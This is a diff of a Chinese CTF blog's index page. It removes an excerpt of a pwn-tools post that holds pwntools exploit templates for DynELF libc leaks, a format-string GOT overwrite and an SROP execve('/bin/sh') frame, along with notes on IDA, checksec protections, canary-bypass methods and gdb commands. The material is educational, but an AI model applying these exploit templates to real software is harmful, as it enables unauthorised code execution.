-<p>DynELF泄露libc<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line">print(<span class="string">&quot;system ====&gt; &quot;</span>, system, hex(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure></p>
-<p>FmtStr格式化字符串<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">pad</span>):</span></span><br><span class="line">	p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">	p.sendline(pad)</span><br><span class="line">	info = p.recv()</span><br><span class="line">	<span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里可以和上面的DynELF类比</span></span><br><span class="line">fmt = FmtStr(exec_fmt)</span><br><span class="line">offset = fmt.offset  <span class="comment"># 获取偏移</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = pro.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_plt = pro.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># 格式化payload构造函数</span></span><br><span class="line"><span class="comment"># 总共四个参数：</span></span><br><span class="line"><span class="comment"># offset --&gt; 偏移量</span></span><br><span class="line"><span class="comment"># writes --&gt; &#123;被覆盖的地址:要写入的地址&#125;</span></span><br><span class="line"><span class="comment"># numbwritten --&gt; 已经由printf函数写入的字节数，默认为0</span></span><br><span class="line"><span class="comment"># write_size --&gt; 逐byte/short/int写入，默认是byte，这样发送的字节少</span></span><br><span class="line">pad = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">p.send(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细的介绍链接 + 例子</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/115061803</span></span><br></pre></td></tr></table></figure></p>
-<p>SROP工具SigreturnFrame<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line"><span class="comment"># sigreturn 代表可以触发sigreturn调用的地址</span></span><br><span class="line"><span class="comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x001 mov rax, 0Fh</span></span><br><span class="line"><span class="string">0x002 syscall</span></span><br><span class="line"><span class="string">0x003 ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sigreturn = <span class="number">0x001</span></span><br><span class="line">syscall = <span class="number">0x002</span>  <span class="comment"># syscall gadget</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">pad = padding + bytes(frame)  <span class="comment"># python3</span></span><br><span class="line">p.send(pad)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位注意以下几个方面</span></span><br><span class="line"><span class="comment"># 1、上下文初始化</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line"><span class="comment"># frame = SigreturnFrame(kernel=&quot;i386&quot;)</span></span><br><span class="line"><span class="comment"># 2、frame.eax = xx  注意寄存器的名字</span></span><br><span class="line"><span class="comment"># 3、syscall指令在32位下可以找int 80</span></span><br></pre></td></tr></table></figure><br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/110990925">https://blog.csdn.net/A951860555/article/details/110990925</a></p>
-<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>新建选GO<br>将文件拖入<br><img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/1.png" class><br>得到汇编码</p>
-<p>找到入口点F5得到伪C代码（也许能看得懂）<br>shift+F12找出字符串（带””的内容，可能有重要内容）<br>双击函数、变量跳出所在位置</p>
-<p>菜单工具栏中View Toolbars下有两个子菜单，分别时Basci mode 和 Advanced mode<br>逆向工作区一般有7个子窗口：<br> IDA View-A 反汇编试图A<br> Hex View-A 16进制试图A<br> Functions Window 函数窗口<br> Structures 结构体<br> Enums 枚举<br> Imports 导入数据<br> Exports 导出数据</p>
-<p>IDA在静态分析时会自动分析已知和未知的函数，通常有如下几种标识：<br> Sub_XXXXX 子程序<br> loc_XXXXXX 地址，多用于跳转指令的目的地<br> byte_XXXXX 标识一个字节型的数据<br> word_XXXX 字型数据<br> dword_XXX 双字型数据<br> unk_XXXXX 未知类型数据</p>
-<p>跳转至某个位置，快捷键G</p>
-<p>一个程序运行先存放在内存中<br>IDA分析寄存器地址（CPU），内存地址（内存）的数据完成反汇编    </p>
-<p>IDA解析数据和代码之间的转换<br>很多程序为了防止被破解，加入了花指令。所谓花指令，是在代码中插入了数据使得反汇编引擎错误的将数据解析成为代码，因此从错误解析的位置开始往后的汇编代码都会被错误的解析。它是一种常用的对抗静态分析的手段。<br>如果逆向者发现IDA错误地将代码解析成为了数据或者错误地将数据解析成为了代码，可以通过快捷键“C”和快捷键“D”，在数据和代码之间解析。</p>
-<p>int_64分为两种储存方式（存进内存）<br>大端存储<br>ABCDEFG<br>小端存储<br>GFEDCBA</p>
-<p>遇到大数据+0LL后缀可能是没被转化的原进制数，因为花指令的干扰。<br>选中数据按R键转化</p>
-<p>右键copy to assmbly<br>将伪代码一行一行翻译成汇编码</p>
-<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。<br>checksec是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。<br>checksec的使用方法：<br>checksec –file /usr/sbin/sshd</p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/3.png" class>
-<p>（这张是我在网上随便找的）</p>
-<h2 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h2><p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p>
-<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO<br>Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell，<br>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
-<h2 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞是，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，当启用栈保护后，函数开始执行的时候先会往栈里插入类似cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行，攻击者在<strong>覆盖返回地址</strong>的时候往往会将cookie信息给覆盖掉，导致栈保护检车失败而阻止shellcode的执行，在linux中我们将cookie信息称为canary。因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
-<p>canary保存在栈的某个位置上，一般来说64位的话会在rbp-0x8的位置，32位则在ebp-0x4的位置。当我们进行栈溢出的时候如果覆盖了canary值，程序就会调用stack_chk_fail来打印报错信息。</p>
-<p><strong>通常有以下几种绕过方法：</strong></p>
-<p>1、通过read函数泄露canary。关键的一点就是read函数读取字符串的时候不会在末尾加上“\x00”,这就是gets函数不能用来泄露canary的原因（有些输出函数遇到‘\0’会截断）。</p>
-<p>2、暴力破解canary。这种方法利用起来有限制，就是一般要程序中有fork函数创造出子进程，因为子进程是父进程复制出来的，所以canary也就跟父进程相同，在子进程中覆盖canary后报错就会退回到父进程，此时canary的值是不会改变的。</p>
-<p>3、劫持stack_chk_fail。因为canary被覆盖的时候会调用这个函数，所以如果我们可以利用程序中的漏洞（比如格式化字符串）改got表中stack_chk_fail的地址为one_gadget的地址就能getshell。</p>
-<p>4、利用stack_chk_fail的报错信息。在报错信息中，会将你发生栈溢出的程序名调用输出，其位置位于argv[0]，我们可以将argv[0]的地址改写为我们想要获取的内容的地址，使它随着错误提示一起输出。</p>
-<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。<br>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
-<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PTE（Position-Independent  Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息</p>
-<h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1><p><strong>一些简单的命令</strong><br>gdb 文件名 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r 运行</span><br><span class="line">disass 函数名					&#x2F;&#x2F;查看函数的反汇编代码</span><br><span class="line">i b							&#x2F;&#x2F;查看断点</span><br><span class="line">d 断点编号 						&#x2F;&#x2F;删除断点</span><br><span class="line">checksec 						&#x2F;&#x2F;查看elf编译的保护选项。</span><br><span class="line">file [file] 					&#x2F;&#x2F;加载objfile</span><br><span class="line">disas addr 						&#x2F;&#x2F;对地址addr处的指令进行反汇编，addr可以是函数名</span><br><span class="line">b *addr 							&#x2F;&#x2F;在addr处下一个断点 </span><br><span class="line">x addr 							&#x2F;&#x2F;查看addr处存储的数据值  </span><br><span class="line">c 								&#x2F;&#x2F;继续运行 </span><br><span class="line">ni 								&#x2F;&#x2F;单步执行不进入</span><br><span class="line">si 								&#x2F;&#x2F;单步执行并进入 </span><br><span class="line">vmmap 							&#x2F;&#x2F;得到虚拟映射地址</span><br></pre></td></tr></table></figure>
-<p><strong>一些例子</strong></p>
-<p><code>aslr</code> – 显示/设定GDB的ASLR(地址空间配置随机加载)设置 </p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/1.jpg" class>
-<p><code>dumpargs</code> – 函数将要被调用时，显示将要被传入函数的所有参数(默认会在反汇编代码下方自动显示)</p>
-<p><code>dumprop</code> – 在给定内存范围中Dump出所有ROP gadgets </p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/2.jpg" class>
-<p><code>elfheader</code> – Get headers information from debugged ELF file</p>
-<p><code>elfsymbol</code> – 获取non-debugging symbol信息（plt表）</p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/3.jpg" class>
-<p><code>lookup</code> – Search for all addresses/references to addresses which belong to a memory range</p>
-<p><code>patch</code> – Patch memory start at an address with string/hexstring/int</p>
-<p><code>pattern create size</code> 生成特定长度字符串</p>
-<p><code>pattern offset value</code> 定位字符串 </p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/4.jpg" class>
-<p><code>searchmem|find</code> – 在内存中查找字符串，支持正则表达式 </p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/5.jpg" class>
-<p><code>shellcode</code> – 生成shellcode</p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/6.jpg" class>
-<p><code>vmmap</code> – 可以用来查看栈、bss段是否可以执行 </p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/7.jpg" class>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1139,7 +1080,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
